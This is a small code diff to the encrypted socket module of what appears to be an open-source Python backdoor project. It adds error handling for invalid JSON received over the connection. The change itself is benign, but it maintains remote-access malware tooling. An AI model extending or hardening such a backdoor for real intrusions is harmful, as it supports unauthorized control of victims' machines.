@@ -7,6 +7,7 @@ license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 import json
 import logging
+from json import JSONDecodeError
 
 from src.definitions.commands import OK_SENDALL
 from src.logger import LOGGER_ID
@@ -56,7 +57,10 @@ class EncryptedSocket:
         return decrypt(self.socket.recv(BUFFER), self.key)
 
     def recv_json(self):
-        data = json.loads(self.recv())
+        try:
+            data = json.loads(self.recv())
+        except JSONDecodeError:
+            raise Exception("Invalid JSON data received")
 
         self.logger.debug(f"recv: {data}")
 
